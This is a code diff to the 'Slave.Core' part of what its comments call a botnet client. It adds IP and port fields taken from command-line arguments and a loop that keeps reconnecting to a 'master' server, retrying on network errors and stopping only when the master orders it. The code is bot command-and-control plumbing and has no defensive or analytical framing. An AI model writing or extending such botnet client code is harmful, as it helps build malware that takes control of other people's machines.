@@ -14,6 +14,16 @@ namespace Slave.Core
         internal SlaveCommandsManager commandsManager { get; set; }
 
         /// <summary>
+        /// IP to connect to, set from program's arguments
+        /// </summary>
+        public static string ip { get; set; } = null;
+
+        /// <summary>
+        /// Port to connect to, set from program's arguments
+        /// </summary>
+        public static int port { get; set; } = 0;
+
+        /// <summary>
         /// Time in ms to wait for between each botnet server contact
         /// </summary>
         readonly int botnetServerRequestRetryDelay = 5000;
@@ -90,6 +100,34 @@ namespace Slave.Core
                 }
 
                 Thread.Sleep(botnetServerRequestRetryDelay);
+            }
+        }
+
+
+        /// <summary>
+        /// Entry point of the slave manager, call the RunSlave() method
+        /// </summary>
+        public void StartWithArguments()
+        {
+            while (true)
+            {
+                try
+                {
+                    RunSlave(ip, port);
+                }
+                catch (NetworkException)
+                {
+                    // Exceptions thrown trigger the network manager cleanup
+                    Cleanup();
+                    connectionRetryCount--;
+                    Thread.Sleep(masterConnectionRetryDelay);
+                }
+                catch (ExitException)
+                {
+                    Cleanup();
+                    // The master asked to stop the connection, break from the connection loop
+                    break;
+                }
             }
         }
 
